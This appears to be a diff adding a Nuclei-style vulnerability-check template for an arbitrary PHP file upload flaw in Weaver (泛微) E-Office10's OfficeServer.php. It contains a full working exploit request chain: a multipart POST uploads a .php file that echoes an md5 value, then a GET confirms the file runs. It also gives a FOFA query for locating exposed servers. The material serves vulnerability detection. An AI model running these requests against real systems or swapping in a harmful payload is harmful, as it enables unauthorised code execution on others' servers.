@@ -1,0 +1,56 @@
+id: poc-local-oa-weaver-eoffice10-officeserver-file-upload
+
+info:
+  name: 泛微OA E-Office10 OfficeServer.php 任意文件上传漏洞
+  author: capiton
+  severity: critical
+  description: 泛微OA E-Office10 OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20OfficeServer.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: body="/eoffice10/client/web"
+    Vulnerability-Impact: 泛微OA E-Office10
+  tags: weaver,ecology,fanwei,eoffice,eoffice10
+
+variables:
+  randomInt: "{{rand_int(100000,999999)}}"
+  md5_randomPayload: "{{md5(randomInt)}}"
+
+requests:
+  - raw:
+      - |
+        POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cache-Control: max-age=0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data;name="FileData";filename="{{randstr}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5({{randomInt}});?>
+
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data;name="FormData"
+
+        {'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{randstr}}.php'}
+        ------WebKitFormBoundary{{randstr}}--
+
+      - |
+        GET /eoffice10/server/public/iWebOffice2015/Document/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_randomPayload}}"
